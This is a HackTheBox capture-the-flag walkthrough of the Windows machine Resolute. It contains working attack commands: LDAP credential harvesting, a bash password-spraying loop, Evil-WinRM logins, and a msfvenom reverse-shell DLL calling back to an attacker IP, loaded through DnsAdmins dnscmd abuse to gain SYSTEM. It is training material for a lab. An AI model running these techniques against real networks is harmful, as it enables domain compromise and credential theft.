---
title: "Resolute - HackTheBox Walkthrough"
date: 2026-01-11 13:30:00 +1100
categories: [TryHackMe, HTB]
tags: [active-directory, bloodhound, pentesting, windows, dnsadmins]
image:
  path: /assets/img/posts/resolute-banner.jpg
  alt: Resolute HackTheBox Machine
---

## Machine Info

**Difficulty:** Medium  
**OS:** Windows  
**IP:** 10.129.96.155  
**Domain:** megabank.local

## TL;DR

Found default credentials in LDAP description field, sprayed the password across domain users to gain initial access. Discovered PowerShell transcript logs containing credentials for lateral movement. Exploited DnsAdmins group membership to load a malicious DLL and achieve SYSTEM privileges.

---

## Reconnaissance

Started with a full port scan to identify running services.

```bash
nmap -A -v 10.129.96.155
```

The scan revealed this was a Windows Domain Controller with multiple services exposed including LDAP (389), WinRM (5985), and DNS (53).

## Enumeration

### LDAP Anonymous Bind

Checked if LDAP allowed anonymous binds to extract domain information.

```bash
git clone https://github.com/ropnop/windapsearch.git
cd windapsearch
python3 windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U
```

This returned a list of domain users. Next, I searched for sensitive information in user attributes.

```bash
python3 windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U --full | grep -i password
```

Found something interesting in a user's description field: `password set to Welcome123!`

This looked like a default password that admins set for new accounts.

### Account Lockout Policy

Before attempting password spraying, I verified there was no account lockout policy in place.

```bash
ldapsearch -x -p 389 -h 10.129.96.155 -b "dc=megabank,dc=local" -s sub "*" | grep -i lock
```

The `lockoutThreshold: 0` confirmed no lockout policy existed, so password spraying was safe.

## Initial Access

### Password Spraying

Saved the usernames to a file and created a simple bash script to test the discovered password against all accounts.

```bash
python3 windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U > users.txt
```

Created `spray.sh`:

```bash
for u in $(cat users.txt | awk -F@ '{print $1}' | awk -F: '{print $2}');
do
  rpcclient -U "$u%Welcome123!" -c "getusername;quit" 10.129.96.155 | grep Authority;
done
```

The script found valid credentials: `melanie:Welcome123!`

### WinRM Access

Connected to the machine using Evil-WinRM since port 5985 was open.

```bash
evil-winrm -i 10.129.96.155 -u melanie -p Welcome123!
```

Retrieved the user flag from `C:\Users\melanie\Desktop\user.txt`.

## Lateral Movement

### PowerShell Transcript Discovery

Searched for hidden files and directories that might contain sensitive information.

```powershell
cd C:\
dir -force
```

Found a hidden directory `PSTranscripts` containing PowerShell command logs.

```powershell
cd C:\PSTranscripts\20191203
dir -force
type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

The transcript revealed credentials for user `ryan` in a `net use` command that had been logged: `ryan:Serv3r4Admin4cc123!`

### Accessing Ryan's Account

Logged in as ryan using the discovered credentials.

```bash
evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
```

Checked ryan's group memberships.

```powershell
whoami /all
```

Ryan was a member of the **DnsAdmins** group, which could be exploited for privilege escalation.

## Privilege Escalation

### DnsAdmins Exploitation

Members of DnsAdmins can specify a custom DLL for the DNS service to load. Since DNS runs as SYSTEM, this allows arbitrary code execution with highest privileges.

Created a malicious DLL that would give us a reverse shell.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.166 LPORT=4444 -f dll > rev.dll
```

Started an SMB server to host the DLL.

```bash
sudo impacket-smbserver share . -smb2support
```

Set up a netcat listener to catch the reverse shell.

```bash
nc -lvnp 4444
```

Configured the DNS service to load our malicious DLL from the SMB share.

```powershell
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.15.166\share\rev.dll
```

Restarted the DNS service to trigger the DLL load.

```powershell
sc.exe stop dns
sc.exe start dns
```

The netcat listener received a connection with SYSTEM privileges.

Retrieved the root flag from `C:\Users\Administrator\Desktop\root.txt`.

## Key Takeaways

- Always enumerate LDAP for default credentials and sensitive information in user attributes
- PowerShell transcript logging can expose credentials when passwords are passed as command-line arguments
- DnsAdmins group membership is a known privilege escalation vector in Active Directory environments
- Reverse shells are often more reliable than command execution payloads

---

**Tools Used:** nmap, windapsearch, ldapsearch, rpcclient, evil-winrm, msfvenom, impacket, netcat